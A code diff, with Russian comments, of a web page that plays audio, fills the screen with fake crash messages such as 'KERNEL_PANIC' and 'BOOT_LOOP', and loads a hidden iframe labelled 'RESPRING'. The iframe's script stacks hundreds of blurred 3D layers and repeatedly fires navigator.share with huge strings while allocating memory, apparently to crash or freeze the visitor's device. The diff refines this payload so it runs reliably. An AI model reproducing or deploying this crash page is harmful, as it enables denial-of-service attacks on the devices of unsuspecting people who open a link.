@@ -7,35 +7,31 @@
 
 <style>
 body {
-    background: #8b0000;
-    color: #ffffff;
-    margin: 0;
-    padding: 0;
-    overflow: hidden;
-    font-family: monospace;
-    display: flex;
-    flex-wrap: wrap;
-    gap: 4px;
-    height: 100vh;
+    background:#8b0000;
+    margin:0;
+    overflow:hidden;
+    font-family:monospace;
 }
 
-/* ===== ТЕКСТ ФИКС (ЧТОБ НЕ ПРОПАДАЛ) ===== */
+/* ===== ВАЖНО: фиксируем текст поверх ВСЕГО ===== */
 .error-msg {
     font-size: 6px;
-    opacity: 0.6;
-    user-select: none;
-    position: relative;
-    z-index: 9999; /* ← важно */
+    opacity: 0.7;
+    color: white;
+    position: fixed;   /* ← ключевой фикс */
+    z-index: 999999;   /* ← поверх iframe */
+    pointer-events: none;
+    white-space: nowrap;
 }
 
-/* ===== iframe НЕ ПЕРЕКРЫВАЕТ ЭКРАН ===== */
+/* iframe не мешает */
 #respring-iframe {
     position: fixed;
     width: 1px;
     height: 1px;
     opacity: 0.01;
     pointer-events: none;
-    z-index: -1;
+    z-index: 0;
 }
 </style>
 </head>
@@ -47,84 +43,55 @@ sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>
 
 <script>
 
-/* ===================== AUDIO ===================== */
+/* ================= AUDIO (НЕ ТРОГАЕМ) ================= */
 
-const audioUrl =
-"https://raw.githubusercontent.com/VityaIG/vityaig.github.io/main/otkat.mp3";
+const audioUrl = "https://raw.githubusercontent.com/VityaIG/vityaig.github.io/main/otkat.mp3";
 
-let ctx, buffer, played = false;
+let ctx, buffer, played=false;
 
-async function initAudio() {
-    if (!ctx) {
-        ctx = new (window.AudioContext || window.webkitAudioContext)();
-    }
+async function initAudio(){
+    if(!ctx) ctx = new (window.AudioContext||window.webkitAudioContext)();
 
-    if (!buffer) {
-        const res = await fetch(audioUrl);
-        const arr = await res.arrayBuffer();
-        buffer = await ctx.decodeAudioData(arr);
+    if(!buffer){
+        const r = await fetch(audioUrl);
+        const a = await r.arrayBuffer();
+        buffer = await ctx.decodeAudioData(a);
     }
 }
 
-function playSound() {
-    if (!buffer || played) return;
+function play(){
+    if(!buffer || played) return;
 
-    const source = ctx.createBufferSource();
-    const gain = ctx.createGain();
-
-    source.buffer = buffer;
+    const s = ctx.createBufferSource();
+    const g = ctx.createGain();
 
     const t = ctx.currentTime;
-    gain.gain.setValueAtTime(0.0001, t);
-    gain.gain.exponentialRampToValueAtTime(1, t + 0.01);
+    g.gain.setValueAtTime(0.0001, t);
+    g.gain.exponentialRampToValueAtTime(1, t+0.01);
 
-    source.connect(gain).connect(ctx.destination);
-    source.start();
+    s.buffer = buffer;
+    s.connect(g).connect(ctx.destination);
+    s.start();
 
     played = true;
 }
 
-async function startAudio() {
-    try {
+async function startAudio(){
+    try{
         await initAudio();
-        if (ctx.state === "suspended") await ctx.resume();
-        playSound();
-    } catch(e) {}
+        if(ctx.state==="suspended") await ctx.resume();
+        play();
+    }catch(e){}
 }
 
-window.addEventListener("load", () => {
-    startAudio();
-});
+window.addEventListener("load", ()=> startAudio());
 
-function unlock() {
-    startAudio();
-}
-
-document.addEventListener("click", unlock, { once:true });
-document.addEventListener("touchstart", unlock, { once:true });
-document.addEventListener("pointerdown", unlock, { once:true });
+document.addEventListener("click", startAudio, {once:true});
+document.addEventListener("touchstart", startAudio, {once:true});
+document.addEventListener("pointerdown", startAudio, {once:true});
 
 
-/* ===================== ТЕКСТ (СНАЧАЛА РЕНДЕРИМ) ===================== */
-
-const errorTemplates = [
-"Fatal Error 0x3333",
-"Entering Bootloop...",
-"KERNEL_PANIC",
-"STACK_COLLISION",
-"SYSTEM_FREEZE",
-"HARDWARE_MALFUNCTION"
-];
-
-for (let i = 0; i < 3000; i++) {
-    const span = document.createElement("span");
-    span.className = "error-msg";
-    span.innerText = errorTemplates[Math.floor(Math.random() * errorTemplates.length)];
-    document.body.appendChild(span);
-}
-
-
-/* ===================== RESPRING (ТВОЙ КОД 1:1) ===================== */
+/* ================= RESPRING ================= */
 
 window.onload = function() {
     setTimeout(() => {
@@ -132,32 +99,27 @@ window.onload = function() {
 
         const respringScript = `
             <html>
-            <body style="margin:0; overflow:hidden;">
-                <script>
-                    const container = document.createElement('div');
-                    container.style.cssText =
-                        'perspective: 1px; perspective-origin: 9999999% 9999999%;';
-                    document.body.appendChild(container);
+            <body style="margin:0;overflow:hidden;">
+            <script>
+                const c = document.createElement('div');
+                c.style.cssText = 'perspective:1px;perspective-origin:9999999% 9999999%';
+                document.body.appendChild(c);
 
-                    for (let i = 0; i < 500; i++) {
-                        let d = document.createElement('div');
-                        d.style.cssText =
-                            'position: absolute; width: 100vw; height: 100vh;' +
-                            'backdrop-filter: blur(40px); -webkit-backdrop-filter: blur(40px);' +
-                            'transform: translate3d(100000px, 100000px,' + i + 'px) rotateY(90deg);' +
-                            'opacity: 0.99;';
-                        container.appendChild(d);
-                    }
+                for(let i=0;i<500;i++){
+                    let d=document.createElement('div');
+                    d.style.cssText =
+                        'position:absolute;width:100vw;height:100vh;' +
+                        'backdrop-filter:blur(40px);' +
+                        'transform:translate3d(100000px,100000px,'+i+'px) rotateY(90deg);' +
+                        'opacity:0.99;';
+                    c.appendChild(d);
+                }
 
-                    setInterval(() => {
-                        try {
-                            navigator.share({ title: 'R', text: 'R'.repeat(100000) });
-                        } catch(e) {}
-
-                        let x = new Uint8Array(1024 * 1024 * 10);
-                        crypto.getRandomValues(x);
-                    }, 200);
-                <\/script>
+                setInterval(()=>{
+                    try{ navigator.share({title:'R',text:'R'.repeat(50000)}); }catch(e){}
+                    crypto.getRandomValues(new Uint8Array(1024*512));
+                },200);
+            <\/script>
             </body>
             </html>
         `;
@@ -166,6 +128,33 @@ window.onload = function() {
 
     }, 850);
 };
+
+
+/* ================= ТЕКСТ (ГЛАВНЫЙ ФИКС) ================= */
+
+const errors = [
+"Fatal Error","KERNEL_PANIC","BOOT_LOOP",
+"SYSTEM FAILURE","STACK OVERFLOW"
+];
+
+function spawnText(){
+    for(let i=0;i<300;i++){ // ↓ было 3000 → это ломало WebView
+        const s=document.createElement("span");
+        s.className="error-msg";
+        s.innerText=errors[Math.floor(Math.random()*errors.length)];
+
+        // рандом позиция, чтобы ВСЕГДА было видно
+        s.style.top=Math.random()*100+"vh";
+        s.style.left=Math.random()*100+"vw";
+
+        document.body.appendChild(s);
+    }
+}
+
+/* ВАЖНО: ждём стабильный рендер */
+window.addEventListener("load", ()=>{
+    setTimeout(spawnText, 50);
+});
 
 </script>
 
